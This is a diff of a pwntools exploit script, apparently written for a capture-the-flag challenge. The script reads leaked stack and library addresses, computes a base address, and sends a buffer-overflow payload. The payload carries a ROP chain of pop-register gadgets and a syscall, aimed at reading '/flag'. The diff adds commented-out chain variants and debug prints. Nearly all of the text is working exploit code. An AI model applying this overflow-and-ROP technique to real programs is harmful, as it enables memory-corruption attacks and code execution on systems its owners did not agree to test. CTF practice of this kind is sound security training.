@@ -45,6 +45,15 @@ def rop(base):
     chain = b''.join(map(p64, pop_rdi + pop_rsi + syscall))
     return chain 
 
+# def rop(base):
+#     pop_rdi = base + 0x23b6a 
+#     pop_rsi = base + 0x2601f 
+#     pop_rdx = base + 0x142c92 
+#     pop_rax = base + 0x36174
+#     syscall = base + 0x2284d
+#     chain = b''.join(map(p64, pop_rdi + pop_rsi + pop_rdx + pop_rax + syscall))
+#     return chain
+
 io = start()
 
 # shellcode = asm(shellcraft.sh())
@@ -57,12 +66,17 @@ io = start()
 # log.success(flag)
 io.recvuntil(b'base pointer rbp: ')
 rbp = int(io.recvline(keepends=False), 16)
+# print(rbp+8)
 io.sendline(hex(rbp+8))
 io.recvuntil(b"is: ")
+# leak = int(io.recvline(keepends=False), 16)
 leak = io.recvline()
+# print(addr_val)
 io.recvuntil(b"will be stored: ")
 buf = int(io.recvline(keepends=False), 16)
+# print(buf)
 base = int(leak[:-1],16) - 0x23f90 - 0xF3
+# payload = b'a'*(rbp-buf)+b'/flag' +b'\0'*3 + rop(rbp)
 print(base)
 payload = b'a'*(rbp-buf)+b'/flag' +b'\0'*3 + rop(base)
 
